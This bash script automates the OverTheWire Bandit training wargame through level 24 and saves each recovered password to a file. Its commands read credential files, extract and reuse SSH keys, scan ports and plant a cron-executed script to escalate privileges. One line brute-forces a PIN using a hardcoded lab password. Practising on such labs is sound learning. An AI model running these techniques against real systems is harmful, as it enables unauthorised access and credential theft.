#!/usr/bin/env bash
if ! which sshpass &>/dev/null ; then echo "sshpass not found" ; exit -1; fi
rm -f ./exception.log
BANDIT_DOMAIN='bandit.labs.overthewire.org'
BANDIT_PROT=2220
ssh_comand(){
	local confused_about="ssh_comand doesn't know"
    if [ -z "$1" ]; then
        echo "$confused_about whom to bandit"
        exit -1
    fi
    if [ -z "$2" ]; then
        echo "$confused_about the passwords"
        exit -1
    fi
    if [ -z "$3" ]; then
        echo "$confused_about how to perform the bandit"
        exit -1
    fi
	# StrictHostKeyChecking for skip fingerprint checking
    sshpass -p $2 ssh -o StrictHostKeyChecking=no "bandit${1}@${BANDIT_DOMAIN}" -p "$BANDIT_PROT" "$3" 2>>./exception.log;
    # sshpass -p $2 ssh -o StrictHostKeyChecking=no $1@"$BANDIT_DOMAIN" -p "$BANDIT_PROT" <<-END_SSH_CMD
	# 	$3
	# 	exit
	# END_SSH_CMD
	# can not indent with spaces, nor end with comments
}

extract_last_segment(){
	if [ -z "$1" ]; then
		echo ""
		exit 0
	fi
	# -r read raw data, ignores \. -a read into array
	# declare -a allwords=() # defaults to local in function
	# declare -Ia allwords=() # inherit the outter scope variable's property if there is one
	local allwords=() # Bash only has one dimensional array
	while read -r line; do
		read -ra words <<< "$line"
		# allwords+="$words[@]" # only concatrate to the last element
		# allwords+=("$words") # only append the first array element
		allwords+=(${words[@]}) # append all
		# allwords+=("${words[@]}") # works the same after the expansion
	done <<<"$1"
	if [ ${#allwords[@]} -eq 0 ]; then
		echo ""
	else
		echo "${allwords[${#allwords[@]}-1]}"
	fi
}

print_psw_to_file(){
	echo "Level $(printf "%2d" $1): $2"
	echo "Level $(printf "%2d" $1): $2" >> ./passwords
	# bandit server rejects frequent connection
	sleep 2
}

cache_passwords(){
	local level="0"
	local psw="bandit0"
	if [ -e ./passwords ]; then
		cat ./passwords > ./passwords_original
		rm ./passwords
		while read -r line; do
			[ -z "$line" ] && continue
			# these are the same
			local nLevel=$((level+1))
			# local nLevel=$((${level}+1))
			local pattern="^Level[[:space:]]+${nLevel}[[:space:]]*:[[:space:]]+([a-zA-Z0-9]{32}|bandit${nLevel})$"
			if [[ $line =~ $pattern ]]; then
				psw="${BASH_REMATCH[1]}"
				level=${nLevel}
				echo "$(printf "Level %2d:"  $level) $psw" >> ./passwords
			else
				break
			fi
			# passwords_original's last line may end with EOF
		done <<<"$(cat ./passwords_original)"
		rm ./passwords_original
	fi
	echo "${level} ${psw}"
}

read level psw <<<"$(cache_passwords)"

# echo $level $psw
if [ $level = 0 ]; then
	psw=$(extract_last_segment "$(ssh_comand $level $psw "cat ./readme")")
	level=$((level+1))
	print_psw_to_file $level "$psw"
fi

if [ $level = 1 ]; then
	psw=$(extract_last_segment "$(ssh_comand $level $psw "cat ./-")")
	level=$((level+1))
	print_psw_to_file $level "$psw"
fi

if [ $level = 2 ]; then
	psw=$(extract_last_segment "$(ssh_comand $level $psw "cat './--spaces in this filename--'")")
	level=$((level+1))
	print_psw_to_file $level "$psw"
fi

if [ $level = 3 ]; then
	# substitution happens inside the $() so use sigle quote to forbid passed ssh command's substitution 
	psw=$(extract_last_segment "$(ssh_comand $level $psw 'cat $(find ./inhere -type f)')") 
	level=$((level+1))
	print_psw_to_file $level "$psw"
fi

# !deprecated
# is_line_readable(){
# 	[ -z "$1" ] && return 0 
# 	read -a line <<< "$(echo "$1" | sed 's/../& /g')"
# 	for char in ${line[@]}; do
# 		if [ $((0x$char)) = $((0x0a)) ]; then
# 			# Skip "\n" in the original file
# 			continue
# 		fi
# 		if [ $((0x$char)) -gt $((0x7E)) ] || [ $((0x$char)) -lt $((0x20)) ]; then
# 			return -1
# 		fi
# 	done
# 	return 0
# }

if [ $level = 4 ]; then
	# files=$(ssh_comand $level "$psw" 'for cur_file in $(find ./inhere -type f); do echo $(xxd -p "$cur_file" | tr -d "\n" ); done')
	# echo "$res" > res
	# var=$(echo -e "1\n2\n3\n4")
	# echo $var # echo var_split to 1 2 3 4 # echo 1 2 3 4
	# for cur_file in $files; do
	# 	# use parenthesis to execute command in a subshell, so that main process won't exit
	# 	if (is_line_readable "$cur_file"); then
	# 		# xxd doesn't support -rp, must use -r -p, and -r reads from formatted xxd/hexdump result, -p read from plain hexadecimal dumps
	# 		psw="$(echo "$cur_file" | xxd -r -p)"
	# 		break
	# 	fi
	# done
	psw=$(ssh_comand $level "$psw" \
	'for cur_file in $(find ./inhere -type f); do \
	 	! grep -qoP "[^[:print:]]" "$cur_file" && cat "$cur_file" && break; \
	 done')
	level=$((level+1))
	print_psw_to_file $level "$psw"
fi

if [ $level = 5 ]; then
	# files=$(ssh_comand $level "$psw" 'for cur_file in $(find ./inhere -type f -size 1033c -not -executable); do echo $(xxd -p "$cur_file" | tr -d "\n" ); done')
	# for cur_file in $files; do
	# 	# This check is not actually needed, but is consistant with the problem description 
	# 	if (is_line_readable "$cur_file"); then
	# 		psw=$(extract_last_segment "$(echo "$cur_file" | xxd -r -p)")
	# 		break
	# 	fi
	# done
	psw=$(extract_last_segment "$(ssh_comand $level "$psw" \
			'for cur_file in $(find ./inhere -type f -size 1033c -not -executable); do \
				! grep -qoP "[^[:print:]]" "$cur_file" && cat "$cur_file" && break; \
			done'
		)"
	)
	level=$((level+1))
	print_psw_to_file $level "$psw"
fi

if [ $level = 6 ]; then
	# scanning certain files requires permissions  
	psw=$(ssh_comand $level "$psw" 'find / -type d ! -readable -prune -o -type f -not -path "*/proc/*" -user bandit7 -group bandit6 -size 33c -exec cat {} \;')
	level=$((level+1))
	print_psw_to_file $level "$psw"
fi

if [ $level = 7 ]; then
	# this data.txt looks like this:
	# name1 blablabla1
	# name2 blablabla2
	psw=$(extract_last_segment "$(ssh_comand $level "$psw" 'grep millionth ./data.txt')")
	level=$((level+1))
	print_psw_to_file $level "$psw"
fi

if [ $level = 8 ]; then
	# sort by lines
	psw=$(ssh_comand $level "$psw" 'sort ./data.txt | uniq --unique')
	level=$((level+1))
	print_psw_to_file $level "$psw"
fi

if [ $level = 9 ]; then
	# a: binary, o: ouptut the matched group 0, E: POSIX extended regular expression
	psw=$(extract_last_segment "$(ssh_comand $level "$psw" "grep -aoE '=+\s*([a-zA-Z0-9]{32})' ./data.txt")")
	level=$((level+1))
	print_psw_to_file $level "$psw"
fi

if [ $level = 10 ]; then
	psw=$(extract_last_segment "$(ssh_comand $level "$psw" 'base64 -d ./data.txt')")
	level=$((level+1))
	print_psw_to_file $level "$psw"
fi

if [ $level = 11 ]; then
	psw=$(extract_last_segment "$(ssh_comand $level "$psw" 'cat ./data.txt | tr 'A-Ma-mN-Zn-z' 'N-Zn-zA-Ma-m' ' )")
	level=$((level+1))
	print_psw_to_file $level "$psw"
fi

if [ $level = 12 ]; then
	psw=$(extract_last_segment "$(ssh_comand $level "$psw" 'xxd -r ./data.txt | gzip -d | bzip2 -d | gzip -d | tar -xf - -O | tar -xf - -O | bzip2 -d | tar xf - -O | gzip -d' )")
	level=$((level+1))
	print_psw_to_file $level "$psw"
fi

if [ $level = 13 ]; then
	ssh_comand $level "$psw" 'cat ./sshkey.private' > level13.sshkey
	# archlinux default created with permissions: -rw-r--r-- 1 user user, but termux applies -rw------- root root as default permissions when created by root
	# so as this file is owned by me, ssh will check whether this file is readable by others and thorow permissions are too open if they are wider than 600
	# but if this file is owned by root and ssh from user, ssh only checks whether it is readable, vice versa (ssh still checks readable if ssh launched from root and file is owned by user)
	# so I need to change permissions to 600, or launch from another user which may require passwords
	chmod 600 ./level13.sshkey
	psw="$(ssh -i ./level13.sshkey bandit14@bandit.labs.overthewire.org -p 2220 'cat /etc/bandit_pass/bandit14' 2>>./exception.log)"
	rm ./level13.sshkey
	level=$((level+1))
	print_psw_to_file $level "$psw"
fi

if [ $level = 14 ]; then
	psw=$(extract_last_segment "$(ssh_comand $level $psw "echo $psw | nc localhost 30000")")
	level=$((level+1))
	print_psw_to_file $level "$psw"
fi

if [ $level = 15 ]; then
	# -quiet implicit enabled -ign_eof ignores end of file which then won't disconnect from the server when input reaches the end
	# openssl x509 reads input and output the CA in certain format, don't know why yet, sed -------BEGIN CERTIFICATE--------
	# psw=$(extract_last_segment "$(ssh_comand $level $psw "echo $psw | openssl s_client -connect localhost:30001 -quiet -noservername -verify_quiet -CAfile\
	# 								<(openssl s_client -connect localhost:30001 -showcerts </dev/null 2>/dev/null | openssl x509 -outform PEM)"
	# 							 )"
	# 								# <(echo | openssl s_client -connect localhost:30001 -showcerts 2>/dev/null | openssl x509 -outform PEM)"
	# 	)
	psw=$(extract_last_segment "$(ssh_comand $level $psw "echo $psw | openssl s_client -connect localhost:30001 -quiet -noservername -verify_quiet 2>/dev/null")")
	level=$((level+1))
	print_psw_to_file $level "$psw"
fi

if [ $level = 16 ]; then
    ssh_comand $level $psw '
        for port in $(nmap -oN - localhost -p 31000-32000 | grep -Eo "^3[[:digit:]]{4}"); do
            echo '"${psw}"' | timeout 2 openssl s_client \
                -connect localhost:${port} \
                -quiet \
                -noservername \
                -verify_quiet 2>/dev/null;
        done 2>/dev/null' > level17.sshkey
    chmod 600 level17.sshkey
	psw=$(ssh -i ./level17.sshkey bandit17@$BANDIT_DOMAIN -p $BANDIT_PROT cat /etc/bandit_pass/bandit17 2>>./exception.log)
	rm level17.sshkey
    level=$((level+1))
    print_psw_to_file $level "$psw"
fi

if [ $level = 17 ]; then
	psw=$(ssh_comand $level $psw 'diff ./passwords.new ./passwords.old | grep "<" | cut -d " " -f 2')
    level=$((level+1))
    print_psw_to_file $level "$psw"
fi

if [ $level = 18 ]; then
	psw=$(ssh_comand $level $psw 'cat ./readme')
    level=$((level+1))
    print_psw_to_file $level "$psw"
fi

if [ $level = 19 ]; then
	psw=$(ssh_comand $level $psw './bandit20-do cat /etc/bandit_pass/bandit20')
    level=$((level+1))
    print_psw_to_file $level "$psw"
fi

if [ $level = 20 ]; then
	# & runs in background, and must be followed by a command or newline
	psw="$(ssh_comand $level $psw '(echo '"${psw}"' | nc -l -p 26723 & sleep 1 && ./suconnect 26723 >/dev/null) 2>/dev/null' )"
    level=$((level+1))
    print_psw_to_file $level "$psw"
fi

if [ $level = 21 ]; then
	psw="$(ssh_comand $level $psw 'cat $(cat /usr/bin/cronjob_bandit22.sh | tr -d "\n" | rev | cut -d " " -f 1 | rev)' )"
    level=$((level+1))
    print_psw_to_file $level "$psw"
fi

if [ $level = 22 ]; then
	psw="$(ssh_comand $level $psw "cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)" )"
    level=$((level+1))
    print_psw_to_file $level "$psw"
fi

if [ $level = 23 ]; then
	psw="$(ssh_comand $level $psw 'echo "cat /etc/bandit_pass/bandit24 > /tmp/tmp_rabbit_bandit24" > /var/spool/bandit24/foo/sh_rabbbit_bandit24.sh && chmod +x /var/spool/bandit24/foo/sh_rabbbit_bandit24.sh && sleep 60 && cat /tmp/tmp_rabbit_bandit24 ' )"
    level=$((level+1))
    print_psw_to_file $level "$psw"
fi

if [ $level = 24 ]; then
	psw="$(ssh_comand $level $psw 'rm -f /tmp/tmp_rabbit_bandit24 2>/dev/null; echo "$(for i in {0..9999}; do printf "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 %04d\n" $i; done)" | nc localhost 30002 | grep -oE "[[:alnum:]]{32}$" ' )"
    level=$((level+1))
    print_psw_to_file $level "$psw"
fi
